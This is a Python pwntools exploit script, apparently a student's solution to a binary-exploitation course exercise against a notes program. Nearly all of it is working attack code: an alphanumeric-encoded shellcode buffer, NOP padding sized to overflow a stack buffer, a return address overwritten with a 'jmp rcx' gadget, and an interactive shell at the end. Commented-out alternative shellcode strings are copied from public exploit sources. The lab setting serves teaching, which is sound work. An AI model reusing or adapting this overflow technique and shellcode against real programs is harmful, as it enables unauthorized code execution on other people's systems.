#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise6/exercise6b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x40194d
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# $ ROPgadget --binary handout/exercise6/exercise6b | grep "jmp rcx"
jmp_rcx = 0x401616

r.recvuntil(b'notes:\n')
r.sendline(b'1')

r.recvuntil(b'note:\n')
# from 
# https://nets.ec/Alphanumeric_shellcode#64_bit_shellcode:_Conversion_to_alphanumeric_code
# shellcode = b'\x90'*16 + b'jZTYX4UPXk9AHc49149hJG00X5EB00PXHc1149Hcq01q0Hcq41q4Hcy0Hcq0WZhZUXZX5u7141A0hZGQjX5u49j1A4H3y0XWjXHc9H39XTH394c'

# from
# https://www.exploit-db.com/raw/35205
# shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x6e\x68\x78\x38\x4c\x6f\x61\x52"
buf += b"\x43\x39\x70\x6e\x4e\x4f\x61\x63\x30\x68\x79\x70"
buf += b"\x76\x39\x30\x50\x52\x34\x61\x4f\x6f\x62\x72\x46"
buf += b"\x52\x48\x6c\x6d\x4f\x73\x31\x44\x61\x4e\x70\x52"
buf += b"\x37\x78\x6c\x49\x4d\x30\x49\x70\x59\x70\x4f\x73"
buf += b"\x43\x31\x64\x34\x6b\x70\x6f\x76\x62\x4c\x4f\x71"
buf += b"\x61\x57\x69\x70\x51\x46\x70\x57\x30\x54\x6f\x6e"
buf += b"\x72\x4a\x4f\x4b\x6e\x78\x6c\x4f\x4b\x55\x41\x41"

# r.send(b'\x90' * 16)
r.send(buf)
r.send(b'\x90' * (232 - len(buf)))
r.send(b'\x90' * (4*8))
r.sendline(p64(jmp_rcx))

r.interactive()
